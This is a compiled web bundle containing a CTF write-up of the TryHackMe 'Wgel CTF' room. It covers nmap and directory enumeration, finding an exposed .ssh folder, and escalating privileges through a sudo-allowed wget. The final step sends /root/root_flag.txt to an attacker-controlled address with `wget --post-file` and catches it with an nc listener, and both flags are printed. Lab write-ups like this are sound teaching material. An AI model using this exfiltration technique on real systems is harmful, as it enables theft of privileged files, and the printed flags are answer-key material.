"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[2546],{3905:(e,t,n)=>{n.d(t,{Zo:()=>c,kt:()=>f});var r=n(67294);function o(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function a(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function s(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?a(Object(n),!0).forEach((function(t){o(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):a(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function i(e,t){if(null==e)return{};var n,r,o=function(e,t){if(null==e)return{};var n,r,o={},a=Object.keys(e);for(r=0;r<a.length;r++)n=a[r],t.indexOf(n)>=0||(o[n]=e[n]);return o}(e,t);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)n=a[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(o[n]=e[n])}return o}var l=r.createContext({}),p=function(e){var t=r.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):s(s({},t),e)),n},c=function(e){var t=p(e.components);return r.createElement(l.Provider,{value:t},e.children)},u="mdxType",m={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},d=r.forwardRef((function(e,t){var n=e.components,o=e.mdxType,a=e.originalType,l=e.parentName,c=i(e,["components","mdxType","originalType","parentName"]),u=p(n),d=o,f=u["".concat(l,".").concat(d)]||u[d]||m[d]||a;return n?r.createElement(f,s(s({ref:t},c),{},{components:n})):r.createElement(f,s({ref:t},c))}));function f(e,t){var n=arguments,o=t&&t.mdxType;if("string"==typeof e||o){var a=n.length,s=new Array(a);s[0]=d;var i={};for(var l in t)hasOwnProperty.call(t,l)&&(i[l]=t[l]);i.originalType=e,i[u]="string"==typeof e?e:o,s[1]=i;for(var p=2;p<a;p++)s[p]=n[p];return r.createElement.apply(null,s)}return r.createElement.apply(null,n)}d.displayName="MDXCreateElement"},46846:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>s,default:()=>m,frontMatter:()=>a,metadata:()=>i,toc:()=>p});var r=n(87462),o=(n(67294),n(3905));const a={},s="Wgel CTF",i={unversionedId:"Tryhackme/Wgel CTF/Wgel CTF",id:"Tryhackme/Wgel CTF/Wgel CTF",title:"Wgel CTF",description:"Can you exfiltrate the root flag?",source:"@site/writeups/Tryhackme/Wgel CTF/Wgel CTF.md",sourceDirName:"Tryhackme/Wgel CTF",slug:"/Tryhackme/Wgel CTF/",permalink:"/writeups/Tryhackme/Wgel CTF/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"WebAppSec 101",permalink:"/writeups/Tryhackme/WebAppSec 101/"},next:{title:"Willow",permalink:"/writeups/Tryhackme/Willow/"}},l={},p=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Wgel CTF",id:"task-1-wgel-ctf",level:2}],c={toc:p},u="wrapper";function m(e){let{components:t,...n}=e;return(0,o.kt)(u,(0,r.Z)({},c,n,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"wgel-ctf"},"Wgel CTF"),(0,o.kt)("p",null,"Can you exfiltrate the root flag?"),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/wgelctf"},"Wgel CTF")),(0,o.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Web Poking"),(0,o.kt)("li",{parentName:"ul"},"Security Misconfiguration"),(0,o.kt)("li",{parentName:"ul"},"Misconfigured Binaries")),(0,o.kt)("hr",null),(0,o.kt)("h2",{id:"task-1-wgel-ctf"},"Task 1 Wgel CTF"),(0,o.kt)("p",null,"Have fun with this easy box."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Wgel CTF$ sudo nmap -A -sS -sC -sV -O 10.10.141.253\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 10:21 CEST\nNmap scan report for 10.10.141.253\nHost is up (0.060s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)\n|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)\n|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/14%OT=22%CT=1%CU=31712%PV=Y%DS=2%DC=T%G=Y%TM=5F86B5\nOS:24%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=A)SE\nOS:Q(SP=103%GCD=1%ISR=10F%TI=Z%CI=I%TS=C)OPS(O1=M508ST11NW7%O2=M508ST11NW7%\nOS:O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=68DF%W2\nOS:=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNS\nOS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%\nOS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%\nOS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%\nOS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%\nOS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 8080/tcp)\nHOP RTT      ADDRESS\n1   59.64 ms 10.8.0.1\n2   59.92 ms 10.10.141.253\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 25.98 seconds\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Wgel CTF$ gobuster dir -u 10.10.141.253 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.141.253\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/10/14 10:22:09 Starting gobuster\n===============================================================\n/sitemap (Status: 301)\nProgress: 4548 / 220561 (2.06%)^C\n[!] Keyboard interrupt detected, terminating.\n===============================================================\n2020/10/14 10:22:33 Finished\n===============================================================\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Wgel CTF$ sudo /opt/dirsearch/dirsearch.py -u http://10.10.141.253/sitemap/ -E -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt\n[sudo] password for kali:\n\n  _|. _ _  _  _  _ _|_    v0.4.0\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, asp, aspx, jsp, jspx, html, htm, js | HTTP method: GET | Threads: 20 | Wordlist size: 4658\n\nError Log: /opt/dirsearch/logs/errors-20-10-14_10-27-05.log\n\nTarget: http://10.10.141.253/sitemap/\n\nOutput File: /opt/dirsearch/reports/10.10.141.253/sitemap_20-10-14_10-27-05.txt\n\n[10:27:05] Starting:\n[10:27:06] 301 -  321B  - /sitemap/.ssh  ->  http://10.10.141.253/sitemap/.ssh/\n[10:27:09] 301 -  320B  - /sitemap/css  ->  http://10.10.141.253/sitemap/css/\n[10:27:11] 301 -  322B  - /sitemap/fonts  ->  http://10.10.141.253/sitemap/fonts/\n[10:27:11] 301 -  323B  - /sitemap/images  ->  http://10.10.141.253/sitemap/images/\n[10:27:11] 200 -   21KB - /sitemap/index.html\n[10:27:12] 301 -  319B  - /sitemap/js  ->  http://10.10.141.253/sitemap/js/\n\nTask Completed\n")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"view-source:http://10.10.141.253/"},"view-source:http://10.10.141.253/")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-html"},"<pre>\n/etc/apache2/\n|-- apache2.conf\n|       `--  ports.conf\n|-- mods-enabled\n|       |-- *.load\n|       `-- *.conf\n|-- conf-enabled\n|       `-- *.conf\n|-- sites-enabled\n|       `-- *.conf\n\n\n \x3c!-- Jessie don't forget to udate the webiste --\x3e\n          </pre>\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"jessie@CorpOne:~$ ls\nDesktop  Documents  Downloads  examples.desktop  Music  Pictures  Public  Templates  Videos\njessie@CorpOne:~$ cd Documents/\njessie@CorpOne:~/Documents$ ls\nuser_flag.txt\njessie@CorpOne:~/Documents$ cat user_flag.txt\n057c67131c3d5e42dd5cd3075b198ff6\n")),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://gtfobins.github.io/gtfobins/wget/#sudo"},"https://gtfobins.github.io/gtfobins/wget/#sudo")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"jessie@CorpOne:~$ sudo -l\nMatching Defaults entries for jessie on CorpOne:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser jessie may run the following commands on CorpOne:\n    (ALL : ALL) ALL\n    (root) NOPASSWD: /usr/bin/wget\njessie@CorpOne:~$ sudo wget --post-file=/root/root_flag.txt 10.8.106.222:9001\n--2020-10-14 11:33:40--  http://10.8.106.222:9001/\nConnecting to 10.8.106.222:9001... connected.\nHTTP request sent, awaiting response...\n")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Wgel CTF$ nc -nlvp 9001\nlistening on [any] 9001 ...\nconnect to [10.8.106.222] from (UNKNOWN) [10.10.141.253] 41824\nPOST / HTTP/1.1\nUser-Agent: Wget/1.17.1 (linux-gnu)\nAccept: */*\nAccept-Encoding: identity\nHost: 10.8.106.222:9001\nConnection: Keep-Alive\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 33\n\nb1b968b37519ad1daa6408188649263d\n")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},"User flag")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"057c67131c3d5e42dd5cd3075b198ff6")),(0,o.kt)("ol",{start:2},(0,o.kt)("li",{parentName:"ol"},"Root flag")),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"b1b968b37519ad1daa6408188649263d")))}m.isMDXComponent=!0}}]);